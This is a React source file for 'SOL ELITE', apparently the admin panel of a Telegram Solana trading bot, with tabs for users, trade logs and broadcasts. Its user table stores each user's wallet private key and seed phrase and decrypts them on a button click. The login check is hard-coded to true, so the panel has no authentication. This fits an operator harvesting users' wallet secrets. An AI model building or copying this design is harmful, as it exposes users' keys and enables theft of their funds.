import React, { useState, useEffect } from "react";
import { 
  Users, 
  Shield, 
  Search, 
  Lock, 
  Unlock, 
  RefreshCw, 
  Database,
  BarChart3,
  Wallet,
  MessageSquare,
  History,
  Send,
  ExternalLink,
  TrendingUp,
  ArrowUpRight,
  ArrowDownRight
} from "lucide-react";
import { motion, AnimatePresence } from "motion/react";

interface User {
  id: number;
  telegram_id: number;
  username: string;
  wallet_address: string;
  private_key: string;
  recovery_phrase: string;
  created_at: string;
}

interface Trade {
  id: number;
  username: string;
  token: string;
  amount: number;
  type: 'buy' | 'sell';
  timestamp: string;
}

interface Stats {
  users: number;
  trades: number;
}

type Tab = 'users' | 'trades' | 'broadcast';

export default function App() {
  const [isLoggedIn, setIsLoggedIn] = useState(true);
  const [activeTab, setActiveTab] = useState<Tab>('users');
  const [users, setUsers] = useState<User[]>([]);
  const [trades, setTrades] = useState<Trade[]>([]);
  const [stats, setStats] = useState<Stats>({ users: 0, trades: 0 });
  const [search, setSearch] = useState("");
  const [decryptedValues, setDecryptedValues] = useState<Record<string, string>>({});
  const [loading, setLoading] = useState(false);
  
  // Broadcast state
  const [broadcastMsg, setBroadcastMsg] = useState("");
  const [broadcastStatus, setBroadcastStatus] = useState<{ success?: number, fail?: number } | null>(null);

  useEffect(() => {
    fetchData();
  }, []);

  const fetchData = async () => {
    setLoading(true);
    try {
      const [usersRes, statsRes, tradesRes] = await Promise.all([
        fetch("/api/admin/users"),
        fetch("/api/admin/stats"),
        fetch("/api/admin/trades")
      ]);
      const usersData = await usersRes.json();
      const statsData = await statsRes.json();
      const tradesData = await tradesRes.json();
      setUsers(usersData);
      setStats(statsData);
      setTrades(tradesData);
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const handleDecrypt = async (id: number, field: 'private_key' | 'recovery_phrase', encryptedText: string) => {
    const key = `${id}-${field}`;
    if (decryptedValues[key]) {
      const newValues = { ...decryptedValues };
      delete newValues[key];
      setDecryptedValues(newValues);
      return;
    }

    const res = await fetch("/api/admin/decrypt", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ encryptedText }),
    });
    if (res.ok) {
      const { decrypted } = await res.json();
      setDecryptedValues(prev => ({ ...prev, [key]: decrypted }));
    } else {
      alert("Decryption failed");
    }
  };

  const handleBroadcast = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!broadcastMsg.trim()) return;
    
    setLoading(true);
    try {
      const res = await fetch("/api/admin/broadcast", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: broadcastMsg }),
      });
      const data = await res.json();
      setBroadcastStatus({ success: data.successCount, fail: data.failCount });
      setBroadcastMsg("");
    } catch (err) {
      alert("Broadcast failed");
    } finally {
      setLoading(false);
    }
  };

  const filteredUsers = users.filter(u => 
    u.username.toLowerCase().includes(search.toLowerCase()) || 
    u.wallet_address.toLowerCase().includes(search.toLowerCase()) ||
    u.telegram_id.toString().includes(search)
  );

  const filteredTrades = trades.filter(t => 
    t.username.toLowerCase().includes(search.toLowerCase()) || 
    t.token.toLowerCase().includes(search.toLowerCase())
  );

  if (!isLoggedIn) return null;

  return (
    <div className="min-h-screen bg-[#050505] text-zinc-400 font-sans selection:bg-emerald-500/30">
      {/* Sidebar / Navigation */}
      <div className="flex flex-col lg:flex-row min-h-screen">
        <aside className="w-full lg:w-72 bg-[#0a0a0a] border-r border-white/5 p-6 flex flex-col">
          <div className="flex items-center gap-3 mb-12 px-2">
            <div className="w-10 h-10 bg-emerald-500 rounded-xl flex items-center justify-center">
              <TrendingUp className="text-black w-6 h-6" />
            </div>
            <span className="text-white font-black text-xl tracking-tighter">SOL ELITE</span>
          </div>

          <nav className="space-y-2 flex-1">
            <button 
              onClick={() => setActiveTab('users')}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'users' ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20' : 'hover:bg-white/5 text-zinc-500'}`}
            >
              <Users className="w-5 h-5" />
              <span className="font-bold text-sm">Users</span>
            </button>
            <button 
              onClick={() => setActiveTab('trades')}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'trades' ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20' : 'hover:bg-white/5 text-zinc-500'}`}
            >
              <History className="w-5 h-5" />
              <span className="font-bold text-sm">Trade Logs</span>
            </button>
            <button 
              onClick={() => setActiveTab('broadcast')}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'broadcast' ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20' : 'hover:bg-white/5 text-zinc-500'}`}
            >
              <MessageSquare className="w-5 h-5" />
              <span className="font-bold text-sm">Broadcast</span>
            </button>
          </nav>

          <div className="mt-auto pt-6 border-t border-white/5">
            <div className="bg-[#111] rounded-2xl p-4 border border-white/5">
              <div className="flex items-center gap-3 mb-3">
                <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
                <span className="text-xs font-bold text-white uppercase tracking-widest">System Status</span>
              </div>
              <p className="text-[10px] text-zinc-600 leading-relaxed">
                Terminal connected to Solana Mainnet-Beta. All systems operational.
              </p>
            </div>
          </div>
        </aside>

        {/* Main Content */}
        <main className="flex-1 p-6 lg:p-12 overflow-y-auto">
          <header className="flex flex-col md:flex-row md:items-center justify-between gap-6 mb-12">
            <div>
              <h2 className="text-4xl font-black text-white tracking-tight uppercase">
                {activeTab === 'users' && "User Directory"}
                {activeTab === 'trades' && "Transaction History"}
                {activeTab === 'broadcast' && "Global Broadcast"}
              </h2>
              <p className="text-zinc-500 mt-2">
                {activeTab === 'users' && `Managing ${stats.users} active terminal users`}
                {activeTab === 'trades' && `Monitoring ${stats.trades} total transactions`}
                {activeTab === 'broadcast' && "Send encrypted messages to all connected wallets"}
              </p>
            </div>

            <div className="flex items-center gap-4">
              <div className="relative">
                <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-600" />
                <input
                  type="text"
                  placeholder="Search..."
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                  className="bg-[#0a0a0a] border border-white/5 rounded-2xl py-3 pl-12 pr-4 focus:outline-none focus:border-emerald-500/30 w-full md:w-64 text-sm transition-all"
                />
              </div>
              <button 
                onClick={fetchData}
                className="p-3 bg-[#0a0a0a] border border-white/5 rounded-2xl hover:bg-white/5 transition-all active:scale-95"
              >
                <RefreshCw className={`w-5 h-5 ${loading ? 'animate-spin' : ''}`} />
              </button>
            </div>
          </header>

          <AnimatePresence mode="wait">
            {activeTab === 'users' && (
              <motion.div 
                key="users"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="space-y-6"
              >
                {/* Stats Row */}
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-3xl relative overflow-hidden group">
                    <div className="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity">
                      <Users className="w-24 h-24" />
                    </div>
                    <p className="text-zinc-500 text-xs font-black uppercase tracking-widest mb-2">Total Users</p>
                    <p className="text-5xl font-black text-white">{stats.users}</p>
                  </div>
                  <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-3xl relative overflow-hidden group">
                    <div className="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity">
                      <BarChart3 className="w-24 h-24" />
                    </div>
                    <p className="text-zinc-500 text-xs font-black uppercase tracking-widest mb-2">Total Trades</p>
                    <p className="text-5xl font-black text-white">{stats.trades}</p>
                  </div>
                  <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-3xl relative overflow-hidden group">
                    <div className="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity">
                      <Wallet className="w-24 h-24" />
                    </div>
                    <p className="text-zinc-500 text-xs font-black uppercase tracking-widest mb-2">Network</p>
                    <p className="text-3xl font-black text-emerald-500 mt-2 uppercase">Mainnet</p>
                  </div>
                </div>

                {/* Table */}
                <div className="bg-[#0a0a0a] border border-white/5 rounded-3xl overflow-hidden shadow-2xl">
                  <div className="overflow-x-auto">
                    <table className="w-full text-left border-collapse">
                      <thead>
                        <tr className="bg-white/[0.02] border-b border-white/5">
                          <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">Identity</th>
                          <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">Wallet Address</th>
                          <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">Security Access</th>
                          <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">Joined</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-white/5">
                        {filteredUsers.map((user) => (
                          <tr key={user.id} className="hover:bg-white/[0.01] transition-colors group">
                            <td className="p-6">
                              <div className="flex items-center gap-4">
                                <div className="w-10 h-10 bg-zinc-900 rounded-xl flex items-center justify-center border border-white/5 text-white font-bold">
                                  {user.username[0].toUpperCase()}
                                </div>
                                <div className="flex flex-col">
                                  <span className="text-white font-bold">@{user.username}</span>
                                  <span className="text-[10px] text-zinc-600 font-mono">UID: {user.telegram_id}</span>
                                </div>
                              </div>
                            </td>
                            <td className="p-6">
                              <div className="flex items-center gap-2">
                                <code className="text-xs bg-emerald-500/5 px-3 py-1.5 rounded-lg text-emerald-500 border border-emerald-500/10 font-mono">
                                  {user.wallet_address.slice(0, 12)}...{user.wallet_address.slice(-12)}
                                </code>
                                <a 
                                  href={`https://solscan.io/account/${user.wallet_address}`} 
                                  target="_blank" 
                                  rel="noreferrer"
                                  className="p-1.5 hover:bg-white/5 rounded-lg transition-colors text-zinc-600 hover:text-white"
                                >
                                  <ExternalLink className="w-3.5 h-3.5" />
                                </a>
                              </div>
                            </td>
                            <td className="p-6">
                              <div className="flex flex-col gap-2">
                                <button 
                                  onClick={() => handleDecrypt(user.id, 'private_key', user.private_key)}
                                  className="flex items-center justify-between gap-4 text-[10px] bg-zinc-900/50 hover:bg-zinc-900 px-3 py-2 rounded-xl border border-white/5 transition-all w-48"
                                >
                                  <span className="text-zinc-600 uppercase font-black tracking-tighter">Private Key</span>
                                  <div className="flex items-center gap-2">
                                    <span className="font-mono text-zinc-400">
                                      {decryptedValues[`${user.id}-private_key`] ? decryptedValues[`${user.id}-private_key`].slice(0, 4) + "..." : "••••"}
                                    </span>
                                    {decryptedValues[`${user.id}-private_key`] ? <Unlock className="w-3 h-3 text-emerald-500" /> : <Lock className="w-3 h-3 text-zinc-700" />}
                                  </div>
                                </button>
                                <button 
                                  onClick={() => handleDecrypt(user.id, 'recovery_phrase', user.recovery_phrase)}
                                  className="flex items-center justify-between gap-4 text-[10px] bg-zinc-900/50 hover:bg-zinc-900 px-3 py-2 rounded-xl border border-white/5 transition-all w-48"
                                >
                                  <span className="text-zinc-600 uppercase font-black tracking-tighter">Seed Phrase</span>
                                  <div className="flex items-center gap-2">
                                    <span className="font-mono text-zinc-400">
                                      {decryptedValues[`${user.id}-recovery_phrase`] ? decryptedValues[`${user.id}-recovery_phrase`].slice(0, 4) + "..." : "••••"}
                                    </span>
                                    {decryptedValues[`${user.id}-recovery_phrase`] ? <Unlock className="w-3 h-3 text-emerald-500" /> : <Lock className="w-3 h-3 text-zinc-700" />}
                                  </div>
                                </button>
                              </div>
                            </td>
                            <td className="p-6 text-xs font-medium text-zinc-600">
                              {new Date(user.created_at).toLocaleDateString(undefined, { month: 'short', day: 'numeric', year: 'numeric' })}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              </motion.div>
            )}

            {activeTab === 'trades' && (
              <motion.div 
                key="trades"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="bg-[#0a0a0a] border border-white/5 rounded-3xl overflow-hidden shadow-2xl"
              >
                <div className="overflow-x-auto">
                  <table className="w-full text-left border-collapse">
                    <thead>
                      <tr className="bg-white/[0.02] border-b border-white/5">
                        <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">User</th>
                        <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">Type</th>
                        <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">Token Address</th>
                        <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">Amount</th>
                        <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">Time</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-white/5">
                      {filteredTrades.map((trade) => (
                        <tr key={trade.id} className="hover:bg-white/[0.01] transition-colors">
                          <td className="p-6">
                            <span className="text-white font-bold">@{trade.username}</span>
                          </td>
                          <td className="p-6">
                            <span className={`px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border ${trade.type === 'buy' ? 'bg-emerald-500/10 text-emerald-500 border-emerald-500/20' : 'bg-red-500/10 text-red-500 border-red-500/20'}`}>
                              {trade.type}
                            </span>
                          </td>
                          <td className="p-6">
                            <div className="flex items-center gap-2">
                              <code className="text-xs font-mono text-zinc-500">
                                {trade.token.slice(0, 16)}...
                              </code>
                              <a 
                                href={`https://solscan.io/token/${trade.token}`} 
                                target="_blank" 
                                rel="noreferrer"
                                className="text-zinc-700 hover:text-white transition-colors"
                              >
                                <ExternalLink className="w-3 h-3" />
                              </a>
                            </div>
                          </td>
                          <td className="p-6">
                            <span className="text-white font-black">{trade.amount}</span>
                            <span className="text-[10px] text-zinc-600 ml-1 uppercase font-bold">{trade.type === 'buy' ? 'SOL' : 'UNITS'}</span>
                          </td>
                          <td className="p-6 text-xs text-zinc-600">
                            {new Date(trade.timestamp).toLocaleString()}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
                {filteredTrades.length === 0 && (
                  <div className="p-20 text-center">
                    <History className="w-16 h-16 text-zinc-800 mx-auto mb-4" />
                    <p className="text-zinc-600 font-bold uppercase tracking-widest">No transaction data found</p>
                  </div>
                )}
              </motion.div>
            )}

            {activeTab === 'broadcast' && (
              <motion.div 
                key="broadcast"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="max-w-2xl"
              >
                <div className="bg-[#0a0a0a] border border-white/5 p-10 rounded-3xl shadow-2xl">
                  <div className="flex items-center gap-4 mb-8">
                    <div className="w-12 h-12 bg-emerald-500/10 rounded-2xl flex items-center justify-center border border-emerald-500/20">
                      <Send className="w-6 h-6 text-emerald-500" />
                    </div>
                    <div>
                      <h3 className="text-xl font-black text-white uppercase tracking-tight">Global Dispatch</h3>
                      <p className="text-xs text-zinc-500 mt-1">Message will be sent to {stats.users} active users</p>
                    </div>
                  </div>

                  <form onSubmit={handleBroadcast} className="space-y-6">
                    <div className="space-y-2">
                      <label className="text-[10px] font-black text-zinc-600 uppercase tracking-widest ml-1">Message Content</label>
                      <textarea 
                        value={broadcastMsg}
                        onChange={(e) => setBroadcastMsg(e.target.value)}
                        placeholder="Type your announcement here..."
                        rows={6}
                        className="w-full bg-[#111] border border-white/5 rounded-2xl p-6 focus:outline-none focus:border-emerald-500/30 text-white placeholder:text-zinc-800 resize-none transition-all"
                      />
                    </div>

                    <button 
                      type="submit"
                      disabled={loading || !broadcastMsg.trim()}
                      className="w-full bg-white hover:bg-zinc-200 disabled:opacity-50 disabled:hover:bg-white text-black font-black py-4 rounded-2xl transition-all flex items-center justify-center gap-3 active:scale-[0.98]"
                    >
                      {loading ? <RefreshCw className="w-5 h-5 animate-spin" /> : <Send className="w-5 h-5" />}
                      EXECUTE BROADCAST
                    </button>
                  </form>

                  {broadcastStatus && (
                    <motion.div 
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="mt-8 p-6 bg-emerald-500/5 border border-emerald-500/10 rounded-2xl flex items-center justify-between"
                    >
                      <div className="flex items-center gap-4">
                        <div className="w-10 h-10 bg-emerald-500/20 rounded-xl flex items-center justify-center">
                          <Shield className="w-5 h-5 text-emerald-500" />
                        </div>
                        <div>
                          <p className="text-white font-bold text-sm">Broadcast Complete</p>
                          <p className="text-[10px] text-zinc-500 uppercase tracking-widest mt-0.5">Transmission Successful</p>
                        </div>
                      </div>
                      <div className="flex gap-6">
                        <div className="text-center">
                          <p className="text-emerald-500 font-black text-xl">{broadcastStatus.success}</p>
                          <p className="text-[8px] text-zinc-600 uppercase font-black">Sent</p>
                        </div>
                        <div className="text-center">
                          <p className="text-red-500 font-black text-xl">{broadcastStatus.fail}</p>
                          <p className="text-[8px] text-zinc-600 uppercase font-black">Failed</p>
                        </div>
                      </div>
                    </motion.div>
                  )}
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </main>
      </div>
    </div>
  );
}
